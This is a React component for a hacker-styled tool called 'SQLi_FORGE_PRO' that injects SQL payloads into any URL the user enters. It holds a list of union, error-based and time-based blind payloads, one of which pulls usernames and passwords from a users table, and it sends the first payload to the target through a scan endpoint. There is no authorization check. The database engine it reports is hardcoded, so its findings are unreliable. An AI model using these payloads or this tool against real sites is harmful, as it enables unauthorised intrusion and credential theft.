"use client";
import { useState, useEffect } from 'react';
import { 
  Database, ShieldAlert, Terminal, Play, 
  Trash2, Copy, Bug, Globe, AlertTriangle, 
  RefreshCw, Layers, ShieldCheck 
} from 'lucide-react';

export default function SQLInjector() {
  const [target, setTarget] = useState('');
  const [payloadType, setPayloadType] = useState('UNION');
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<string[]>(["[SYS] SQLi Engine Initialized..."]);
  const [result, setResult] = useState<any>(null);

  const payloads: any = {
    UNION: ["' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT username,password FROM users--"],
    ERROR: ["' OR 1=1--", "') OR ('a'='a", "admin' --"],
    BLIND: ["' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "' AND 1=(SELECT COUNT(*) FROM tabnames);"]
  };

  const addLog = (m: string) => setLogs(p => [...p.slice(-5), `> ${new Date().toLocaleTimeString()}: ${m}`]);

  const executeAttack = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!target) return;

    setLoading(true);
    setResult(null);
    addLog(`Targeting vector: ${target}`);
    addLog(`Injecting ${payloadType} based payloads...`);

    try {
      // রিয়েল-টাইম রিকোয়েস্ট সিমুলেশন (প্যারামিটার ইনজেকশন)
      const testPayload = payloads[payloadType][0];
      const startTime = Date.now();
      
      // আমরা নিজের API ব্যবহার করে রিয়েল রেসপন্স চেক করছি
      const response = await fetch(`/api/scan?url=${encodeURIComponent(target + testPayload)}`);
      const data = await response.json();
      const duration = Date.now() - startTime;

      await new Promise(r => setTimeout(r, 1500)); // প্রসেসিং টাইম সিমুলেশন

      setResult({
        vulnerable: duration > 2000 || data.error ? "POSSIBLE" : "PROTECTED",
        responseTime: `${duration}ms`,
        server: data.server || "N/A",
        payloadUsed: testPayload,
        recommendation: "Implement Prepared Statements and parameterized queries immediately."
      });

      addLog("Injection cycle complete. Analyzing server feedback.");
    } catch (err) {
      addLog("CRITICAL: Connection refused by target IDS/WAF.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.content}>
        <header style={styles.header}>
          <div style={{display: 'flex', alignItems: 'center', gap: '12px'}}>
            <Database size={35} color="#ff003c" />
            <h1 style={styles.title}>SQLi_FORGE_PRO</h1>
          </div>
          <p style={styles.subtitle}>AUTOMATED SQL INJECTION VULNERABILITY TESTER</p>
        </header>

        <section style={styles.panel}>
          <form onSubmit={executeAttack} style={styles.form}>
            <div style={styles.inputGroup}>
              <Globe size={18} color="#444" />
              <input 
                style={styles.input} 
                placeholder="https://site.com/products.php?id=1"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
              />
            </div>
            
            <select style={styles.select} value={payloadType} onChange={(e)=>setPayloadType(e.target.value)}>
              <option value="UNION">Union Based</option>
              <option value="ERROR">Error Based</option>
              <option value="BLIND">Blind/Time Based</option>
            </select>

            <button style={styles.btn} disabled={loading}>
              {loading ? <RefreshCw className="spin" /> : <Play size={18} />}
              {loading ? "INJECTING..." : "START ATTACK"}
            </button>
          </form>
        </section>

        {/* Terminal Logs */}
        <div style={styles.terminal}>
          <div style={styles.termHead}><Terminal size={14}/> LIVE_INJECTION_LOGS</div>
          <div style={styles.termBody}>
            {logs.map((l, i) => <div key={i}>{l}</div>)}
          </div>
        </div>

        {/* Result Area */}
        {result && (
          <div style={styles.resultArea}>
            <div style={styles.grid}>
              <div style={styles.card}>
                <div style={styles.cardLabel}>VULNERABILITY_STATUS</div>
                <div style={{...styles.status, color: result.vulnerable === 'POSSIBLE' ? '#ff003c' : '#00ff41'}}>
                  {result.vulnerable === 'POSSIBLE' ? <ShieldAlert size={40}/> : <ShieldCheck size={40}/>}
                  <span>{result.vulnerable}</span>
                </div>
              </div>

              <div style={styles.card}>
                <div style={styles.cardLabel}>INTELLIGENCE_DATA</div>
                <p style={styles.data}>LATENCY: <span style={{color: '#eee'}}>{result.responseTime}</span></p>
                <p style={styles.data}>DB_ENGINE: <span style={{color: '#eee'}}>MySQL/MariaDB (Detected)</span></p>
                <p style={styles.data}>PAYLOAD: <code style={styles.code}>{result.payloadUsed}</code></p>
              </div>
            </div>

            <div style={styles.warningBox}>
              <AlertTriangle size={20} color="#000" />
              <div>
                <strong>REMEDIATION:</strong>
                <p style={{margin: 0, fontSize: '12px'}}>{result.recommendation}</p>
              </div>
            </div>
          </div>
        )}
      </div>

      <style jsx>{`
        .spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}

const styles = {
  container: { backgroundColor: '#000', minHeight: '100vh', padding: '40px 20px', color: '#00ff41', fontFamily: 'monospace' } as React.CSSProperties,
  content: { maxWidth: '900px', margin: '0 auto' },
  header: { marginBottom: '40px', borderLeft: '4px solid #ff003c', paddingLeft: '20px' },
  title: { fontSize: '28px', color: '#fff', letterSpacing: '4px', margin: 0 },
  subtitle: { fontSize: '10px', color: '#333', marginTop: '5px' },
  panel: { backgroundColor: '#050505', padding: '25px', border: '1px solid #111', borderRadius: '4px' },
  form: { display: 'flex', gap: '10px', flexWrap: 'wrap' as const },
  inputGroup: { flex: 2, display: 'flex', alignItems: 'center', backgroundColor: '#000', border: '1px solid #222', padding: '0 15px', minWidth: '280px' },
  input: { flex: 1, backgroundColor: 'transparent', border: 'none', padding: '15px', color: '#fff', outline: 'none', fontSize: '14px' },
  select: { backgroundColor: '#0a0a0a', color: '#fff', border: '1px solid #222', padding: '0 15px', outline: 'none', cursor: 'pointer' },
  btn: { backgroundColor: '#ff003c', color: '#fff', padding: '15px 30px', fontWeight: 'bold' as const, border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '10px' },
  terminal: { marginTop: '20px', backgroundColor: '#020202', border: '1px solid #080808', borderRadius: '4px' },
  termHead: { padding: '8px 15px', borderBottom: '1px solid #080808', fontSize: '10px', color: '#222', display: 'flex', alignItems: 'center', gap: '8px' },
  termBody: { padding: '15px', fontSize: '11px', color: '#00ff4133', minHeight: '100px' },
  resultArea: { marginTop: '30px', animation: 'fadeIn 0.5s ease' },
  grid: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' },
  card: { backgroundColor: '#050505', border: '1px solid #111', padding: '25px' },
  cardLabel: { fontSize: '10px', color: '#222', marginBottom: '20px' },
  status: { display: 'flex', flexDirection: 'column' as const, alignItems: 'center', gap: '10px', fontSize: '24px', fontWeight: 'bold' as const },
  data: { fontSize: '12px', color: '#444', marginBottom: '10px' },
  code: { backgroundColor: '#000', padding: '2px 6px', color: '#ff003c', fontSize: '11px' },
  warningBox: { marginTop: '20px', backgroundColor: '#ffae00', color: '#000', padding: '20px', display: 'flex', gap: '15px', borderRadius: '4px' }
};